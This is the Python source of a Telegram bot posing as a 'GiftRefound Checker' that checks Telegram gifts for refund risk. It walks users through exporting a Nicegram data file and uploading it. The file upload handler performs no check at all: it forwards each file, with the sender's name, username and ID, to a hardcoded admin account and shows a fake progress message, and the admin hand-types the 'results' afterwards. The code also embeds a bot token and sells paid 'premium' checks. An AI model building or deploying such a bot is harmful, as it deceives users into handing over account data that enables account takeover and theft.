import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import sqlite3
from datetime import datetime

BOT_TOKEN = "7956796612:AAFRjhOw_4yT0039kOnmMHQEdoDrJchT3go"
ADMIN_ID = 8362897345
DB = "refound_bot.db"

bot = telebot.TeleBot(BOT_TOKEN)

def init_db():
    conn = sqlite3.connect(DB)
    cur = conn.cursor()
    cur.execute("""
        CREATE TABLE IF NOT EXISTS checks (
            user_id INTEGER,
            username TEXT,
            file_id TEXT,
            status TEXT,
            check_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    """)
    conn.commit()
    conn.close()

@bot.message_handler(commands=['start'])
def start(message):
    keyboard = InlineKeyboardMarkup()
    keyboard.row(InlineKeyboardButton("🔍 Проверить на Refound", callback_data="check_refound"))
    keyboard.row(InlineKeyboardButton("📖 Инструкция", callback_data="instruction"))
    keyboard.row(InlineKeyboardButton("💎 Премиум проверка", callback_data="premium"))
    keyboard.row(InlineKeyboardButton("👨‍💻 Поддержка", callback_data="support"))
    
    caption = """
🎁 <b>Добро пожаловать в GiftRefound Checker!</b>

Здесь ты можешь проверить любой Telegram-подарок на возможность возврата (Refound) перед покупкой!

🔍 <b>Проверка покажет:</b>
• Возможен ли возврат подарка
• Историю предыдущих возвратов  
• Риски при покупке
• Рекомендации по безопасности

⚡ <b>Как это работает?</b>
1. Скачиваешь файл данных из Nicegram
2. Отправляешь его боту
3. Получаешь детальный анализ за 5 секунд!

🛡️ <b>Покупай с уверенностью!</b>
    """
    
    bot.send_photo(message.chat.id, "https://i.postimg.cc/gXgxWWVs/design-image.jpg", 
                  caption=caption, reply_markup=keyboard, parse_mode='HTML')

@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    if call.data == "check_refound":
        instruction_text = """
📁 <b>Отправьте файл данных Nicegram</b>

1. Откройте Nicegram
2. Зайдите в Настройки → Nicegram 
3. Нажмите "Экспортировать в файл"
4. Отправьте полученный файл сюда

⏳ <b>Проверка займет 5-10 минут</b>
После анализа вы получите полный отчет о возможности возврата подарка.
        """
        bot.edit_message_caption(chat_id=call.message.chat.id, message_id=call.message.message_id,
                               caption=instruction_text, parse_mode='HTML',
                               reply_markup=InlineKeyboardMarkup().add(InlineKeyboardButton("🔙 Назад", callback_data="back_to_menu")))
    
    elif call.data == "instruction":
        instruction_text = """
📖 <b>Инструкция по проверке:</b>

1. <b>Скачайте Nicegram</b>
   - Нажмите кнопку ниже для скачивания
   - Или перейдите на официальный сайт

2. <b>Экспортируйте данные:</b>
   - Откройте Nicegram
   - Настройки → Nicegram
   - "Экспортировать в файл"

3. <b>Отправьте файл боту</b>
   - Вернитесь в этого бота
   - Нажмите "Проверить на Refound"
   - Отправьте полученный файл

4. <b>Получите результат</b>
   - Анализ займет 5-10 минут
   - Вы получите детальный отчет
        """
        keyboard = InlineKeyboardMarkup()
        keyboard.add(InlineKeyboardButton("📱 Скачать Nicegram", url="https://nicegram.app"))
        keyboard.add(InlineKeyboardButton("🔍 Проверить файл", callback_data="check_refound"))
        keyboard.add(InlineKeyboardButton("🔙 Назад", callback_data="back_to_menu"))
        
        bot.edit_message_caption(chat_id=call.message.chat.id, message_id=call.message.message_id,
                               caption=instruction_text, parse_mode='HTML', reply_markup=keyboard)
    
    elif call.data == "premium":
        premium_text = """
💎 <b>Премиум проверка</b>

<b>Что входит:</b>
• Приоритетная обработка (2-3 минуты)
• Расширенный анализ истории
• Персональные рекомендации
• Поддержка 24/7

<b>Стоимость:</b>
• 1 проверка - 50 руб
• 5 проверок - 200 руб
• 10 проверок - 350 руб

💬 <b>Для активации напишите в поддержку</b>
        """
        keyboard = InlineKeyboardMarkup()
        keyboard.add(InlineKeyboardButton("👨‍💻 Написать в поддержку", url="https://t.me/your_support"))
        keyboard.add(InlineKeyboardButton("🔙 Назад", callback_data="back_to_menu"))
        
        bot.edit_message_caption(chat_id=call.message.chat.id, message_id=call.message.message_id,
                               caption=premium_text, parse_mode='HTML', reply_markup=keyboard)
    
    elif call.data == "support":
        support_text = """
👨‍💻 <b>Поддержка</b>

По всем вопросам обращайтесь:
• По поводу проверок
• Технические проблемы  
• Премиум доступ
• Сотрудничество

📞 <b>Связь:</b>
@your_support_username

⏰ <b>Время работы:</b>
Круглосуточно
        """
        keyboard = InlineKeyboardMarkup()
        keyboard.add(InlineKeyboardButton("💬 Написать", url="https://t.me/your_support_username"))
        keyboard.add(InlineKeyboardButton("🔙 Назад", callback_data="back_to_menu"))
        
        bot.edit_message_caption(chat_id=call.message.chat.id, message_id=call.message.message_id,
                               caption=support_text, parse_mode='HTML', reply_markup=keyboard)
    
    elif call.data == "back_to_menu":
        keyboard = InlineKeyboardMarkup()
        keyboard.row(InlineKeyboardButton("🔍 Проверить на Refound", callback_data="check_refound"))
        keyboard.row(InlineKeyboardButton("📖 Инструкция", callback_data="instruction"))
        keyboard.row(InlineKeyboardButton("💎 Премиум проверка", callback_data="premium"))
        keyboard.row(InlineKeyboardButton("👨‍💻 Поддержка", callback_data="support"))
        
        caption = """
🎁 <b>Добро пожаловать в GiftRefound Checker!</b>

Здесь ты можешь проверить любой Telegram-подарок на возможность возврата (Refound) перед покупкой!

🔍 <b>Проверка покажет:</b>
• Возможен ли возврат подарка
• Историю предыдущих возвратов  
• Риски при покупке
• Рекомендации по безопасности

⚡ <b>Как это работает?</b>
1. Скачиваешь файл данных из Nicegram
2. Отправляешь его боту
3. Получаешь детальный анализ за 5 секунд!

🛡️ <b>Покупай с уверенностью!</b>
        """
        
        bot.edit_message_caption(chat_id=call.message.chat.id, message_id=call.message.message_id,
                               caption=caption, parse_mode='HTML', reply_markup=keyboard)

@bot.message_handler(content_types=['document'])
def handle_file(message):
    user = message.from_user
    
    bot.reply_to(message, "🔍 <b>Файл получен! Начинаем проверку...</b>\n\n⏳ <b>Примерное время:</b> 5-10 минут\n📊 <b>Статус:</b> Анализ данных...\n\nМы пришлем вам результат как только проверка будет завершена!", parse_mode='HTML')
    
    admin_text = f"""
📨 <b>Новый файл для проверки!</b>

👤 <b>Пользователь:</b> {user.first_name} (@{user.username})
🆔 <b>ID:</b> {user.id}
📅 <b>Время:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
💾 <b>Файл:</b> {message.document.file_name}
    """
    
    try:
        bot.send_document(ADMIN_ID, message.document.file_id, caption=admin_text, parse_mode='HTML')
        
        conn = sqlite3.connect(DB)
        cur = conn.cursor()
        cur.execute("INSERT INTO checks (user_id, username, file_id, status) VALUES (?, ?, ?, ?)",
                   (user.id, user.username, message.document.file_id, "pending"))
        conn.commit()
        conn.close()
        
        print(f"Файл от {user.id} переслан админу")
        
    except Exception as e:
        print(f"Ошибка: {e}")
        bot.reply_to(message, "❌ Ошибка при обработке файла. Попробуйте позже.")

@bot.message_handler(commands=['result'])
def send_result(message):
    if message.from_user.id != ADMIN_ID:
        return
    
    args = message.text.split()[1:]
    if len(args) < 2:
        bot.reply_to(message, "Использование: /result <user_id> <текст результата>")
        return
    
    user_id = int(args[0])
    result_text = " ".join(args[1:])
    
    try:
        bot.send_message(user_id, f"📊 <b>Результат проверки:</b>\n\n{result_text}", parse_mode='HTML')
        bot.reply_to(message, "✅ Результат отправлен пользователю")
        
        conn = sqlite3.connect(DB)
        cur = conn.cursor()
        cur.execute("UPDATE checks SET status = ? WHERE user_id = ? AND status = ?",
                   ("completed", user_id, "pending"))
        conn.commit()
        conn.close()
        
    except Exception as e:
        bot.reply_to(message, f"❌ Ошибка: {e}")

if __name__ == "__main__":
    init_db()
    print("✅ Бот для проверки Refound запущен!")
    bot.polling(none_stop=True)
